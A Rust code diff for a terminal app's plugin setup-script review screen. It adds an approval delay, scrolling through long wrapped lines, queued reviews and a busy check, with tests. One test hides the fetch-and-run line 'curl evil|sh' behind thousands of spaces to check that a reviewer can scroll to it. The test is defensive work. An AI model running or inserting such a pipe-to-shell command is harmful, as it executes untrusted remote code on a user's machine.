@@ -131,9 +131,16 @@ pub struct PluginsWin {
 pub struct Review {
     pub target: SetupTarget,
     pub text: String,
-    /// the first script line shown
+    /// the first display row shown (long lines wrap, so every byte can be scrolled to)
     pub scroll: usize,
+    /// approve does nothing until `APPROVE_DELAY` after this: a stray Enter can't approve
+    pub opened: Instant,
+    /// the last frame's (display rows, box rows, box columns), set by the draw
+    pub view: std::cell::Cell<(usize, usize, usize)>,
 }
+
+/// How long after a review appears before Enter or a click can approve it.
+pub const APPROVE_DELAY: Duration = Duration::from_millis(700);
 
 pub enum SetupTarget {
     /// a new plugin in staging: kept only if setup exits 0
@@ -241,6 +248,8 @@ pub struct App {
     plugin_rx: std::sync::mpsc::Receiver<PluginMsg>,
     /// plugin names staging, in review or running setup: a second install of one waits
     busy: Vec<String>,
+    /// staged installs waiting for the Plugins screen to show their review
+    pending: Vec<plugins::Staged>,
     setups: Vec<SetupRun>,
 }
 
@@ -288,6 +297,7 @@ impl App {
             plugin_tx,
             plugin_rx,
             busy: Vec::new(),
+            pending: Vec::new(),
             setups: Vec::new(),
         };
         app.refresh();
@@ -667,6 +677,9 @@ impl App {
                     Err(e) => format!("Could not update {name}: {e}"),
                 });
             }
+            KeyCode::Char('d') if self.busy.iter().any(|n| n == name) => {
+                self.say(format!("{name} is busy: remove it after its setup ends."))
+            }
             KeyCode::Char('d') => {
                 self.modal = Some(Modal::Confirm(Confirm {
                     id: format!("plugin:{name}"),
@@ -691,6 +704,7 @@ impl App {
             form: form.then(Form::add_plugin),
             ..PluginsWin::default()
         });
+        self.next_review();
     }
 
     /// The Plugins screen's list: installed, then available, then the add button; filtered by
@@ -726,7 +740,8 @@ impl App {
             return;
         };
         if let Some(r) = w.review.as_mut() {
-            let last = r.text.split('\n').count().saturating_sub(1);
+            let (rows, h, _) = r.view.get();
+            let last = rows.saturating_sub(h);
             match key.code {
                 KeyCode::Up => r.scroll = r.scroll.saturating_sub(1),
                 KeyCode::Down => r.scroll = (r.scroll + 1).min(last),
@@ -862,22 +877,44 @@ impl App {
         let Some(text) = text else {
             return self.say("no setup script");
         };
-        let w = self.plugins_win.get_or_insert_with(PluginsWin::default);
-        if w.review.is_some() {
-            // one review at a time
-            if let SetupTarget::Install(s) = &target {
-                plugins::abort(s);
-                self.busy.retain(|n| *n != name);
+        // only inside the Plugins screen, one at a time: never over a CLI that is taking keys
+        let Some(w) = self.plugins_win.as_mut().filter(|w| w.review.is_none()) else {
+            let open = self.plugins_win.is_some();
+            match target {
+                SetupTarget::Install(s) => {
+                    self.pending.push(s);
+                    self.say(if open {
+                        format!("{name} ready to review after this one.")
+                    } else {
+                        format!("{name} ready to review: open Plugins")
+                    });
+                }
+                SetupTarget::Rerun(_) => self.say(format!("{name}: finish the open review first.")),
             }
-            return self.say(format!("{name}: finish the open review first."));
-        }
+            return;
+        };
         w.review = Some(Review {
             target,
             text,
             scroll: 0,
+            opened: Instant::now(),
+            view: std::cell::Cell::new((0, 0, 0)),
         });
         if !self.busy.contains(&name) {
             self.busy.push(name);
+        }
+    }
+
+    /// Opens the next staged install waiting for review, if the Plugins screen is free.
+    fn next_review(&mut self) {
+        if self
+            .plugins_win
+            .as_ref()
+            .is_some_and(|w| w.review.is_none())
+            && !self.pending.is_empty()
+        {
+            let s = self.pending.remove(0);
+            self.open_review(SetupTarget::Install(s));
         }
     }
 
@@ -893,11 +930,23 @@ impl App {
             }
             SetupTarget::Rerun(_) => self.say("cancelled: setup not run"),
         }
+        self.next_review();
     }
 
     /// Runs the reviewed text (a temp copy of it) as `bash <copy>` in a new `setup:<name>` tab,
     /// in the staging folder (install) or the plugin's folder (rerun, after `config.bak`).
     fn approve(&mut self) {
+        let Some(r) = self.plugins_win.as_ref().and_then(|w| w.review.as_ref()) else {
+            return;
+        };
+        if r.opened.elapsed() < APPROVE_DELAY {
+            return;
+        }
+        let (_, h, w) = r.view.get();
+        // nothing of the script shown (or not drawn yet): nothing to approve
+        if h == 0 || w == 0 {
+            return self.say("window too small to review");
+        }
         let Some(r) = self.plugins_win.as_mut().and_then(|w| w.review.take()) else {
             return;
         };
@@ -942,10 +991,18 @@ impl App {
         self.current = self.tabs.len() - 1;
         self.focus = Focus::Pane;
         let d = dir.to_string_lossy();
+        // Git Bash takes C:/x for sure; backslashes are left to its path guessing
+        let bash_path = |p: &str| {
+            shell_quote(&if cfg!(windows) {
+                p.replace('\\', "/")
+            } else {
+                p.to_string()
+            })
+        };
         let command = format!(
             "cd {} && bash {}",
-            shell_quote(&d),
-            shell_quote(&copy.to_string_lossy())
+            bash_path(&d),
+            bash_path(&copy.to_string_lossy())
         );
         let env = vec![("AI_PLUGIN_DIR".to_string(), Some(d.into_owned()))];
         let (rows, cols) = self.pane_size;
@@ -3535,11 +3592,21 @@ esac"#;
     #[cfg(unix)]
     fn staged_for_review(a: &mut App, src: &std::path::Path) {
         if a.plugins_win.is_none() {
+            a.focus = Focus::Home;
             key(a, KeyCode::Char('P'));
         }
         a.install(src.to_string_lossy().into_owned());
         settle(a, |a| review(a).is_some());
         assert!(review(a).is_some(), "{}", flash(a));
+        ready(a);
+    }
+
+    /// Draws the open review once (it records its size) and moves it past `APPROVE_DELAY`.
+    fn ready(a: &mut App) {
+        screen(a);
+        if let Some(r) = a.plugins_win.as_mut().and_then(|w| w.review.as_mut()) {
+            r.opened = Instant::now() - APPROVE_DELAY - Duration::from_millis(10);
+        }
     }
 
     fn tab_text(a: &App, t: usize) -> String {
@@ -3632,6 +3699,26 @@ esac"#;
         let (lines, _) = screen(&a);
         line_with(&lines, "echo ^[[31mred^G^M");
         line_with(&lines, "echo <U+202E>evil<M-^[>");
+        // invisible and blank-looking characters, each shown by its code
+        let odd = [
+            '\u{ad}',
+            '\u{34f}',
+            '\u{115f}',
+            '\u{1160}',
+            '\u{3164}',
+            '\u{ffa0}',
+            '\u{fe0f}',
+            '\u{e0041}',
+            '\u{a0}',
+            '\u{2003}',
+            '\u{3000}',
+            '\u{fffa}',
+        ];
+        for c in odd {
+            let shown = crate::ui::escape_line(&format!("a{c}b"));
+            assert_eq!(shown, format!("a<U+{:04X}>b", c as u32));
+        }
+        assert_eq!(crate::ui::escape_line("héllo 日本 -x"), "héllo 日本 -x");
         let all = lines.concat();
         assert!(
             !all.chars().any(|c| c.is_control() || c == '\u{202e}'),
@@ -3757,6 +3844,7 @@ esac"#;
         let (lines, _) = screen(&a);
         line_with(&lines, "[ Approve and run ]");
         line_with(&lines, "Plugins › setup good");
+        ready(&mut a);
         key(&mut a, KeyCode::Enter);
         assert_eq!(a.tabs[0].member, "setup:good");
         settle(&mut a, |a| flash(a).contains("setup failed"));
@@ -3772,6 +3860,7 @@ esac"#;
         fs::write(dir.join("setup"), "pwd -P > where\n").unwrap();
         pwin_select(&mut a, "good");
         key(&mut a, KeyCode::Char('s'));
+        ready(&mut a);
         key(&mut a, KeyCode::Enter);
         settle(&mut a, |a| flash(a) == "setup done");
         assert_eq!(flash(&a), "setup done");
@@ -3782,5 +3871,116 @@ esac"#;
         key(&mut a, KeyCode::Char('s'));
         key(&mut a, KeyCode::Esc);
         assert!(review(&a).is_none() && dir.join("plugin").is_file());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn review_scrolls_to_the_end_of_one_huge_line() {
+        let mut a = plugin_app();
+        // 110x40: the box is 99 columns by 26 rows; the tail starts on its own row
+        let line = format!("echo \"{}\"; curl evil|sh", " ".repeat(99 * 40 - 6));
+        let src = setup_src(&a, "mine", &format!("{line}\n"));
+        staged_for_review(&mut a, &src);
+        assert_eq!(review(&a).unwrap().view.get().1, 26);
+        assert_eq!(review(&a).unwrap().view.get().2, 99);
+        let shows = |a: &App| screen(a).0.concat().contains("curl evil|sh");
+        assert!(!shows(&a), "the tail is below the box at first");
+        for _ in 0..60 {
+            key(&mut a, KeyCode::Down);
+            screen(&a);
+        }
+        assert!(shows(&a), "the tail can be scrolled into view");
+        // it stops at the end: one Up moves at once
+        let at = review(&a).unwrap().scroll;
+        key(&mut a, KeyCode::Up);
+        assert_eq!(review(&a).unwrap().scroll, at - 1);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn enter_right_as_the_review_opens_does_not_approve() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        key(&mut a, KeyCode::Char('P'));
+        a.install(src.to_string_lossy().into_owned());
+        settle(&mut a, |a| review(a).is_some());
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        let (_, hits) = screen(&a);
+        let ok = hits
+            .plugin_btns
+            .iter()
+            .find(|b| b.2 == KeyCode::Enter)
+            .unwrap()
+            .0;
+        click(&mut a, &hits, ok.x, ok.y);
+        assert!(
+            a.tabs.is_empty() && review(&a).is_some(),
+            "too soon to approve"
+        );
+        std::thread::sleep(APPROVE_DELAY);
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1, "{}", flash(&a));
+        assert_eq!(a.tabs[0].member, "setup:mine");
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn staging_done_while_in_a_tab_waits_for_the_plugins_screen() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        a.install(src.to_string_lossy().into_owned());
+        a.open("t1");
+        assert!(a.in_tab());
+        settle(&mut a, |a| flash(a).contains("ready to review"));
+        assert_eq!(flash(&a), "mine ready to review: open Plugins");
+        assert!(a.plugins_win.is_none(), "no review over the tab");
+        key(&mut a, KeyCode::Enter);
+        assert!(
+            a.setups.is_empty() && a.plugins_win.is_none(),
+            "keys stay the tab's"
+        );
+        assert!(a.paths.plugins.join(".mine.install").exists());
+        // still busy while it waits
+        a.install(src.to_string_lossy().into_owned());
+        assert!(flash(&a).contains("already being installed"));
+        a.focus = Focus::Home;
+        key(&mut a, KeyCode::Char('P'));
+        assert!(review(&a).is_some_and(|r| r.target.name() == "mine"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn tiny_window_refuses_approval() {
+        let mut a = plugin_app();
+        let src = setup_src(&a, "mine", "exit 0\n");
+        staged_for_review(&mut a, &src);
+        screen_at(&a, 8);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(flash(&a), "window too small to review");
+        assert!(a.tabs.is_empty() && review(&a).is_some());
+        screen(&a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn minus_refuses_while_busy() {
+        let mut a = plugin_app();
+        let dir = a.paths.plugins.join("good");
+        fs::write(dir.join("setup"), "sleep 30\n").unwrap();
+        pwin_select(&mut a, "good");
+        // a setup running in its folder
+        key(&mut a, KeyCode::Char('s'));
+        ready(&mut a);
+        key(&mut a, KeyCode::Enter);
+        assert_eq!(a.tabs.len(), 1);
+        pwin_select(&mut a, "good");
+        key(&mut a, KeyCode::Char('-'));
+        assert!(a.modal.is_none(), "no delete while its setup runs");
+        assert_eq!(flash(&a), "good is busy: remove it after its setup ends.");
+        assert!(dir.join("plugin").is_file());
     }
 }
